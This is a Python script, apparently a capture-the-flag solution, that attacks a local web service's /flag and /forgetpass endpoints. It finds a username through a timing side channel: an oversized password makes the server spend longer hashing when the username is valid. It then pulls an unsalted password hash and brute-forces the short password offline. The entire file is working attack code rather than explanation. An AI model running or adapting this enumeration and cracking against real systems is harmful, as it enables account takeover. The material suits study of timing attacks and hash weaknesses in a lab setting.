import requests
import time
import itertools
import string
import base64
import os
import logging
from Cryptodome.Hash import SHA256
import random
import string



CHARS = string.ascii_letters + string.digits
BASE_IP_PORT = "32798" #don't forget to change this
FLAG_ENDPOINT = f"http://localhost:{BASE_IP_PORT}/flag"
FORGET_ENDPOINT = f"http://localhost:{BASE_IP_PORT}/forgetpass"

BIG_PASSWORD = "A" * 8192
def getHash(string):
    for _ in range(len(string)):
        string = SHA256.new(data=string.encode()).hexdigest()
    return string
def check_username(session, username_guess):
    params = {
        "username": username_guess,
        "password": BIG_PASSWORD
    }

    start = time.perf_counter()
    try:
        r = session.get(FLAG_ENDPOINT, params=params, timeout=1) #adjust timeout based on your feelings
        elapsed = time.perf_counter() - start
        return elapsed, r.text
    except Exception as e:
        return None, str(e)

def find_username():
    maxElapsed = 0
    maxElapsedUser = None
    session = requests.Session()
    session.get(FLAG_ENDPOINT, timeout=1) #get rid of initial overhead
    #AI assisted with only the line below by explaining the itertools syntax, but that's it nothing else. 
    for tup in itertools.product(CHARS, repeat=2): 
        u = "".join(tup)
        # print("Checking Username: ", u)
        elapsed, _ = check_username(session, u)

        if elapsed is None:
            return u
        if maxElapsed < elapsed:
            maxElapsed = elapsed
            maxElapsedUser = u

    return maxElapsedUser

username = ""
def retrieve_unsalted_hash():
    global username
    username = find_username()
    if username is None:
        return None
    print("Found Username", username)

    try:
        r = requests.get(FORGET_ENDPOINT, params={"username": username})
        data = r.json()
        if "UnsaltedPasswordHash" in data:
            return data["UnsaltedPasswordHash"]
    except:
        data = {}
        return None

start = time.perf_counter()

getHash(BIG_PASSWORD)
elapsed = time.perf_counter() - start

print("Delay:", elapsed)


HASH = retrieve_unsalted_hash()
if(HASH == None):
    exit()
# Alternatively, use a rainbow table for sha256
for tup in itertools.product(CHARS, repeat=2): 
    u = "".join(tup)

    if HASH == getHash(u):
        print("Result:", username, u);
        exit(0)
print("No Results found", username);



